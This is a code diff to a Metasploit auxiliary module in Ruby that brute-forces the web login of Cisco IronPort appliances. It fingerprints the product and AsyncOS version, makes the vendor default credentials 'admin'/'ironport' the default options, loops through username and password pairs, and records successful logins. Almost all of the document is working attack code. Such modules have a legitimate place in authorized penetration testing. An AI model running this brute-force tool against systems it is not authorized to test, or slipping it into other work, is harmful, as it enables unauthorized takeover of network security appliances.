@@ -32,80 +32,91 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(443),
-				OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true]),
-				OptString.new('TARGETURI', [true, "URI for Web login. Default: /login", "/login"])
+				OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", true]),
+				OptString.new('USERNAME', [true, "A specific username to authenticate as", "admin"]),
+				OptString.new('PASSWORD', [true, "A specific password to authenticate with", "ironport"])
 			], self.class)
+
+		deregister_options('TARGETURI')
+
 	end
 
 	def run_host(ip)
+		unless check_conn?
+			print_error("#{rhost}:#{rport} - Connection failed, Aborting...")
+			return
+		end
+
 		unless is_app_ironport?
 			print_error("#{rhost}:#{rport} - Application does not appear to be Cisco Ironport. Module will not continue.")
 			return
 		end
 
-		status = try_default_credential
-		return if status == :abort
-
-		print_status("#{rhost}:#{rport} - Brute-forcing...")
+		print_status("#{rhost}:#{rport} - Starting login brute force...")
 		each_user_pass do |user, pass|
 			do_login(user, pass)
 		end
 	end
 
-	#
-	# What's the point of running this module if the app actually isn't Cisco Ironport?
-	#
-
-	def is_app_ironport?
-		res = send_request_cgi(
-		{
-			'uri'       => '/',
-			'method'    => 'GET'
-		})
-
-		if (res)
-			cookie = res.headers['Set-Cookie'].split('; ')[0]
-		end
-
-		res = send_request_cgi(
-		{
-			'uri'       => "/help/wwhelp/wwhimpl/common/html/default.htm",
-			'method'    => 'GET',
-			'cookie'	   => '#{cookie}'
-		})
-
-		if (res and res.body.include?('Cisco IronPort AsyncOS'))
-			version_key = /Cisco IronPort AsyncOS (.+? )/
-			version = res.body.scan(version_key).flatten[0].gsub('"','')
-			product_key = /for (.*)</
-			product = res.body.scan(product_key).flatten[0]
-
-			if (product == 'Security Management Appliances')
-				p_name = 'Cisco IronPort Security Management Appliance (SMA)'
-				print_good("#{rhost}:#{rport} - Running Cisco IronPort #{product} (SMA) - AsyncOS v#{version}")
-			elsif ( product == 'Cisco IronPort Web Security Appliances' )
-				p_name = 'Cisco IronPort Web Security Appliance (WSA)'
-				print_good("#{rhost}:#{rport} - Running #{product} (WSA) - AsyncOS v#{version}")
-			elsif ( product == 'Cisco IronPort Appliances' )
-				p_name = 'Cisco IronPort Email Security Appliance (ESA)'
-				print_good("#{rhost}:#{rport} - Running #{product} (ESA) - AsyncOS v#{version}")
-			end
-
-			return true
-		else
-			return false
+	def check_conn?
+		begin
+			res = send_request_cgi(
+			{
+				'uri'       => '/',
+				'method'    => 'GET'
+			})
+			print_good("#{rhost}:#{rport} - Server is responsive...")
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
+			return
 		end
 	end
 
 	#
-	# Test and see if the default credential works
+	# What's the point of running this module if the app actually isn't Cisco Ironport?
 	#
 
-	def try_default_credential
-		user = 'admin'
-		pass = 'ironport'
-		vprint_status("#{rhost}:#{rport} - Trying default login...")
-		do_login(user, pass)
+	def is_app_ironport?
+			res = send_request_cgi(
+			{
+				'uri'       => '/',
+				'method'    => 'GET'
+			})
+
+			if (res and res.headers['Set-Cookie'])
+
+				cookie = res.headers['Set-Cookie'].split('; ')[0]
+
+				res = send_request_cgi(
+				{
+					'uri'       => "/help/wwhelp/wwhimpl/common/html/default.htm",
+					'method'    => 'GET',
+					'cookie'	   => '#{cookie}'
+				})
+
+				if (res and res.code == 200 and res.body.include?('Cisco IronPort AsyncOS'))
+					version_key = /Cisco IronPort AsyncOS (.+? )/
+					version = res.body.scan(version_key).flatten[0].gsub('"','')
+					product_key = /for (.*)</
+					product = res.body.scan(product_key).flatten[0]
+
+					if (product == 'Security Management Appliances')
+						p_name = 'Cisco IronPort Security Management Appliance (SMA)'
+						print_good("#{rhost}:#{rport} - Running Cisco IronPort #{product} (SMA) - AsyncOS v#{version}")
+					elsif ( product == 'Cisco IronPort Web Security Appliances' )
+						p_name = 'Cisco IronPort Web Security Appliance (WSA)'
+						print_good("#{rhost}:#{rport} - Running #{product} (WSA) - AsyncOS v#{version}")
+					elsif ( product == 'Cisco IronPort Appliances' )
+						p_name = 'Cisco IronPort Email Security Appliance (ESA)'
+						print_good("#{rhost}:#{rport} - Running #{product} (ESA) - AsyncOS v#{version}")
+					end
+
+					return true
+				else
+					return false
+				end
+			else
+				return false
+			end
 	end
 
 	#
@@ -117,9 +128,8 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			res = send_request_cgi(
 			{
-				'uri'       => '/login?CSRFKey=58ca8090-8fa1-4c07-9a87-65a7d4d4aa67',
+				'uri'       => '/login?CSRFKey=5PADuD3Z-10v3-b33R-5h0t-0n4h3R0cK555',
 				'method'    => 'POST',
-				'cookie'	   => '#{cookie_1}',
 				'vars_post' =>
 					{
 						'action' => 'Login',
@@ -136,7 +146,7 @@ class Metasploit3 < Msf::Auxiliary
 				report_hash = {
 					:host   => rhost,
 					:port   => rport,
-					:sname  => '#{p_name}',
+					:sname  => 'Cisco IronPort Appliance',
 					:user   => user,
 					:pass   => pass,
 					:active => true,
@@ -155,5 +165,4 @@ class Metasploit3 < Msf::Auxiliary
 			return :abort
 		end
 	end
-
 end
